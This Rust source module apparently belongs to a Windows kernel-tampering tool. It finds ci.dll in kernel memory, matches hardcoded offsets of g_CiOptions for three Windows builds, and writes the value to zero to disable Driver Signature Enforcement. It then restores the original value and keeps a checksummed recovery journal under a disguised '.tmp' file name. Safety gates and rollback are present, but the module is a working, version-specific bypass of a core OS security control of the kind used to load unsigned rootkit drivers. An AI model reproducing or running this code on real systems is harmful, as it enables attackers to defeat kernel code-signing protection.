//! Exact Code Integrity state inspection and atomic DSE control.

use crate::{
    adapter::{Capabilities, Capability, KernelAdapter},
    bytes::{read_u16, read_u32, write_u32, write_u64, zero},
    kernel::{ImageIdentity, KERNEL_HEADER_BYTES, parse_image_identity},
    output::Output,
    platform::{HostProtection, query_host_protection},
    recovery::{RecoveryError, RecoveryStore, checksum},
    session::KernelSession,
};
use core::fmt::Write;

const JOURNAL_BYTES: usize = 64;
const JOURNAL_MAGIC: u32 = 0x4553_444b;
const JOURNAL_VERSION: u32 = 1;
const JOURNAL_NONCE: u64 = 0x3145_5344_4e52_4b00;
const RECOVERY_NAME: &[u16] = &[99, 97, 99, 104, 101, 55, 67, 49, 65, 46, 116, 109, 112, 0];

const CI_PROFILES: [CiProfile; 3] = [
    CiProfile {
        version: "10.0.19045.6456",
        timestamp: 0x3568_84b4,
        checksum: 0x000f_3eaf,
        image_size: 0x000e_c000,
        options_rva: 0x0003_91d0,
        section: *b".data\0\0\0",
    },
    CiProfile {
        version: "10.0.22621.7517",
        timestamp: 0xdb66_4a74,
        checksum: 0x0010_1997,
        image_size: 0x000f_a000,
        options_rva: 0x0004_3004,
        section: *b"CiPolicy",
    },
    CiProfile {
        version: "10.0.22621.5185",
        timestamp: 0x86b8_cb26,
        checksum: 0x0010_d330,
        image_size: 0x000f_a000,
        options_rva: 0x0004_3004,
        section: *b"CiPolicy",
    },
];

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum DseAction {
    State,
    Cycle,
    Restore,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct CiProfile {
    version: &'static str,
    timestamp: u32,
    checksum: u32,
    image_size: u32,
    options_rva: u32,
    section: [u8; 8],
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct CiContext {
    profile: &'static CiProfile,
    options_address: u64,
    internal_options: u32,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct DseJournal {
    timestamp: u32,
    checksum: u32,
    image_size: u32,
    options_rva: u32,
    original_options: u32,
    changed_options: u32,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct DseError {
    stage: &'static str,
    code: u32,
    rollback: bool,
    recovery_retained: bool,
}

pub fn run<A: KernelAdapter>(adapter: &mut A, action: DseAction, output: &mut Output) {
    let result =
        match action {
            DseAction::State => inspect(adapter, output)
                .map(|()| "[+] Code Integrity state inspected; no changes made"),
            DseAction::Cycle => cycle(adapter, output),
            DseAction::Restore => restore(adapter, output)
                .map(|()| "[+] DSE recovery complete; original state restored"),
        };

    match result {
        Ok(message) => output.line(message),
        Err(error) => {
            let _ = writeln!(
                output,
                "[-] DSE action failed at {} (0x{:08x}); rollback={}; recovery-retained={}",
                error.stage,
                error.code,
                yes_no(error.rollback),
                yes_no(error.recovery_retained)
            );
        }
    }
}

fn inspect<A: KernelAdapter>(adapter: &mut A, output: &mut Output) -> Result<(), DseError> {
    let host = query_host_protection().map_err(platform_error)?;
    const REQUIRED: Capabilities = Capabilities::from_bits(Capability::KernelRead as u32);
    output.line("[*] Inspecting public and internal Code Integrity state");
    let mut session = KernelSession::open(adapter, REQUIRED, 0).map_err(session_error)?;
    let context = resolve_ci(&mut session)?;
    let confirmed = read_internal(session.adapter(), context.options_address)?;

    if confirmed != context.internal_options {
        return Err(dse_error("dse-state-stability", 1237));
    }

    print_state(output, host, context);
    session.close().map_err(close_error)?;

    Ok(())
}

fn cycle<A: KernelAdapter>(adapter: &mut A, output: &mut Output) -> Result<&'static str, DseError> {
    let host = query_host_protection().map_err(platform_error)?;

    if !host.dse_mutation_supported() {
        output.line("[*] DSE mutation refused because VBS or HVCI is active");
        return Ok("[+] DSE safety gate passed; no state was changed");
    }

    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);
    output.line("[*] Cycling internal Driver Signature Enforcement state");
    let mut session = KernelSession::open(adapter, REQUIRED, 4).map_err(session_error)?;
    let context = resolve_ci(&mut session)?;

    if !host.kernel_code_integrity_enabled() || context.internal_options == 0 {
        return Err(dse_error("dse-exact-enabled-state", 5023));
    }

    print_state(output, host, context);
    let journal = DseJournal::new(context);
    let mut record = journal.encode();
    RecoveryStore::write_new(RECOVERY_NAME, &record)
        .map_err(|error| recovery_error(error, false, false))?;
    let write = session.adapter().write_kernel(
        context.options_address,
        &journal.changed_options.to_le_bytes(),
    );
    let changed = read_internal(session.adapter(), context.options_address);
    let changed_valid = write.is_ok() && changed == Ok(journal.changed_options);

    if !changed_valid {
        let rollback = restore_options(
            session.adapter(),
            context.options_address,
            journal.original_options,
        );

        if rollback {
            let _ = RecoveryStore::delete(RECOVERY_NAME);
        }

        zero(&mut record);
        return Err(DseError {
            stage: "dse-change-readback",
            code: write
                .err()
                .map(|error| error.code())
                .or_else(|| changed.err().map(|error| error.code))
                .unwrap_or(13),
            rollback,
            recovery_retained: !rollback,
        });
    }

    output.line("[*] Internal Code Integrity options changed to 0; readback exact");

    if !restore_options(
        session.adapter(),
        context.options_address,
        journal.original_options,
    ) {
        zero(&mut record);
        return Err(retained_error("dse-cycle-restore", 13));
    }

    RecoveryStore::delete(RECOVERY_NAME).map_err(|error| recovery_error(error, true, true))?;
    zero(&mut record);
    session.close().map_err(close_error)?;
    output.line("[*] Original internal Code Integrity options restored exactly");

    Ok("[+] DSE cycle complete; original state restored")
}

fn restore<A: KernelAdapter>(adapter: &mut A, output: &mut Output) -> Result<(), DseError> {
    output.line("[*] Restoring an interrupted DSE cycle");
    let mut record = [0_u8; JOURNAL_BYTES];
    RecoveryStore::read_exact(RECOVERY_NAME, &mut record)
        .map_err(|error| recovery_error(error, false, true))?;
    let journal =
        DseJournal::decode(&record).ok_or_else(|| retained_error("dse-recovery-integrity", 13))?;
    zero(&mut record);
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);
    let mut session = KernelSession::open(adapter, REQUIRED, 4).map_err(session_error)?;
    let context = resolve_ci(&mut session)?;

    if !journal.matches(context)
        || !matches!(
            context.internal_options,
            value if value == journal.original_options || value == journal.changed_options
        )
    {
        return Err(retained_error("dse-recovery-target", 1306));
    }

    if context.internal_options == journal.changed_options
        && !restore_options(
            session.adapter(),
            context.options_address,
            journal.original_options,
        )
    {
        return Err(retained_error("dse-recovery-write", 13));
    }

    RecoveryStore::delete(RECOVERY_NAME).map_err(|error| recovery_error(error, true, true))?;
    session.close().map_err(close_error)?;
    output.line("[*] Original internal Code Integrity options verified");

    Ok(())
}

fn resolve_ci<A: KernelAdapter>(session: &mut KernelSession<'_, A>) -> Result<CiContext, DseError> {
    let (adapter, modules, _, _) = session.parts();
    let module = modules
        .find(b"ci.dll")
        .ok_or_else(|| dse_error("ci-module", 1168))?;
    let mut headers = [0_u8; KERNEL_HEADER_BYTES];
    adapter
        .read_kernel(module.base(), &mut headers)
        .map_err(|error| dse_error("ci-header-read", error.code()))?;
    let identity = parse_image_identity(&headers).ok_or_else(|| dse_error("ci-image", 193))?;
    let profile = match_ci_profile(identity, module.image_size())
        .ok_or_else(|| dse_error("ci-exact-profile", 1306))?;

    if !section_contains(&headers, profile.section, profile.options_rva, 4) {
        zero(&mut headers);
        return Err(dse_error("ci-options-section", 13));
    }

    zero(&mut headers);
    let options_address = module
        .base()
        .checked_add(profile.options_rva as u64)
        .ok_or_else(|| dse_error("ci-options-address", 487))?;
    let internal_options = read_internal(adapter, options_address)?;

    Ok(CiContext {
        profile,
        options_address,
        internal_options,
    })
}

fn match_ci_profile(identity: ImageIdentity, module_size: u32) -> Option<&'static CiProfile> {
    CI_PROFILES.iter().find(|profile| {
        identity.timestamp == profile.timestamp
            && identity.checksum == profile.checksum
            && identity.image_size == profile.image_size
            && module_size == profile.image_size
    })
}

fn section_contains(headers: &[u8], expected: [u8; 8], rva: u32, size: u32) -> bool {
    let Some(nt) = read_u32(headers, 0x3c).map(|value| value as usize) else {
        return false;
    };
    let Some(section_count) = read_u16(headers, nt + 6).map(|value| value as usize) else {
        return false;
    };
    let Some(optional_size) = read_u16(headers, nt + 20).map(|value| value as usize) else {
        return false;
    };
    let Some(mut offset) = nt
        .checked_add(24)
        .and_then(|value| value.checked_add(optional_size))
    else {
        return false;
    };
    let Some(target_end) = rva.checked_add(size) else {
        return false;
    };

    for _ in 0..section_count {
        let Some(section) = headers.get(offset..offset + 40) else {
            return false;
        };
        let mut name = [0_u8; 8];
        name.copy_from_slice(&section[..8]);
        let virtual_size = read_u32(section, 8).unwrap_or(0);
        let virtual_address = read_u32(section, 12).unwrap_or(0);
        let raw_size = read_u32(section, 16).unwrap_or(0);
        let span = core::cmp::max(virtual_size, raw_size);
        let Some(section_end) = virtual_address.checked_add(span) else {
            return false;
        };

        if name == expected && rva >= virtual_address && target_end <= section_end {
            return true;
        }

        offset += 40;
    }

    false
}

fn read_internal<A: KernelAdapter>(adapter: &mut A, address: u64) -> Result<u32, DseError> {
    let mut bytes = [0_u8; 4];
    adapter
        .read_kernel(address, &mut bytes)
        .map_err(|error| dse_error("ci-options-read", error.code()))?;
    let value = read_u32(&bytes, 0).ok_or_else(|| dse_error("ci-options-value", 13))?;
    zero(&mut bytes);

    Ok(value)
}

fn restore_options<A: KernelAdapter>(adapter: &mut A, address: u64, original: u32) -> bool {
    for _ in 0..3 {
        if adapter
            .write_kernel(address, &original.to_le_bytes())
            .is_ok()
            && read_internal(adapter, address) == Ok(original)
        {
            return true;
        }
    }

    false
}

fn print_state(output: &mut Output, host: HostProtection, context: CiContext) {
    let _ = writeln!(
        output,
        "[*] Code Integrity  : public=0x{:08x} internal=0x{:08x}",
        host.code_integrity_options, context.internal_options
    );
    let _ = writeln!(
        output,
        "[*] CI profile      : {} exact PE identity; g_CiOptions resolved offline",
        context.profile.version
    );
    let _ = writeln!(
        output,
        "[*] DSE boundary    : VBS={} HVCI={} mutation-compatible={}",
        enabled_disabled(host.secure_kernel_running()),
        enabled_disabled(host.hvci_enabled()),
        yes_no(host.dse_mutation_supported())
    );
}

impl DseJournal {
    fn new(context: CiContext) -> Self {
        Self {
            timestamp: context.profile.timestamp,
            checksum: context.profile.checksum,
            image_size: context.profile.image_size,
            options_rva: context.profile.options_rva,
            original_options: context.internal_options,
            changed_options: 0,
        }
    }

    fn encode(self) -> [u8; JOURNAL_BYTES] {
        let mut output = [0_u8; JOURNAL_BYTES];
        write_u32(&mut output, 0, JOURNAL_MAGIC);
        write_u32(&mut output, 4, JOURNAL_VERSION);
        write_u32(&mut output, 8, JOURNAL_BYTES as u32);
        write_u32(&mut output, 12, self.timestamp);
        write_u32(&mut output, 16, self.checksum);
        write_u32(&mut output, 20, self.image_size);
        write_u32(&mut output, 24, self.options_rva);
        write_u32(&mut output, 28, self.original_options);
        write_u32(&mut output, 32, self.changed_options);
        write_u64(&mut output, 40, JOURNAL_NONCE);
        let integrity = checksum(&output[..56]);
        write_u64(&mut output, 56, integrity);

        output
    }

    fn decode(input: &[u8; JOURNAL_BYTES]) -> Option<Self> {
        if read_u32(input, 0)? != JOURNAL_MAGIC
            || read_u32(input, 4)? != JOURNAL_VERSION
            || read_u32(input, 8)? != JOURNAL_BYTES as u32
            || read_u64_local(input, 40)? != JOURNAL_NONCE
            || read_u64_local(input, 56)? != checksum(&input[..56])
        {
            return None;
        }

        let journal = Self {
            timestamp: read_u32(input, 12)?,
            checksum: read_u32(input, 16)?,
            image_size: read_u32(input, 20)?,
            options_rva: read_u32(input, 24)?,
            original_options: read_u32(input, 28)?,
            changed_options: read_u32(input, 32)?,
        };

        if journal.timestamp == 0
            || journal.checksum == 0
            || journal.image_size == 0
            || journal.options_rva == 0
            || journal.original_options == 0
            || journal.changed_options != 0
        {
            return None;
        }

        Some(journal)
    }

    fn matches(self, context: CiContext) -> bool {
        self.timestamp == context.profile.timestamp
            && self.checksum == context.profile.checksum
            && self.image_size == context.profile.image_size
            && self.options_rva == context.profile.options_rva
    }
}

fn read_u64_local(input: &[u8], offset: usize) -> Option<u64> {
    let bytes: [u8; 8] = input.get(offset..offset + 8)?.try_into().ok()?;

    Some(u64::from_le_bytes(bytes))
}

const fn dse_error(stage: &'static str, code: u32) -> DseError {
    DseError {
        stage,
        code,
        rollback: false,
        recovery_retained: false,
    }
}

const fn retained_error(stage: &'static str, code: u32) -> DseError {
    DseError {
        stage,
        code,
        rollback: false,
        recovery_retained: true,
    }
}

const fn session_error(error: crate::session::SessionError) -> DseError {
    DseError {
        stage: error.stage,
        code: error.code,
        rollback: false,
        recovery_retained: false,
    }
}

const fn platform_error(error: crate::platform::PlatformError) -> DseError {
    dse_error(error.stage(), error.code())
}

const fn close_error(error: crate::adapter::AdapterError) -> DseError {
    dse_error("adapter-close", error.code())
}

const fn recovery_error(error: RecoveryError, rollback: bool, recovery_retained: bool) -> DseError {
    DseError {
        stage: error.stage(),
        code: error.code(),
        rollback,
        recovery_retained,
    }
}

const fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

const fn enabled_disabled(value: bool) -> &'static str {
    if value { "enabled" } else { "disabled" }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ci_profiles_are_unique() {
        assert_ne!(CI_PROFILES[0].timestamp, CI_PROFILES[1].timestamp);
        assert_ne!(CI_PROFILES[0].section, CI_PROFILES[1].section);
    }

    #[test]
    fn dse_journal_round_trip_is_exact() {
        let context = CiContext {
            profile: &CI_PROFILES[0],
            options_address: 0xffff_8000_0000_1000,
            internal_options: 6,
        };
        let journal = DseJournal::new(context);

        assert_eq!(DseJournal::decode(&journal.encode()), Some(journal));
    }

    #[test]
    fn dse_journal_rejects_tampering() {
        let context = CiContext {
            profile: &CI_PROFILES[0],
            options_address: 0xffff_8000_0000_1000,
            internal_options: 6,
        };
        let mut record = DseJournal::new(context).encode();
        record[24] ^= 1;

        assert_eq!(DseJournal::decode(&record), None);
    }
}
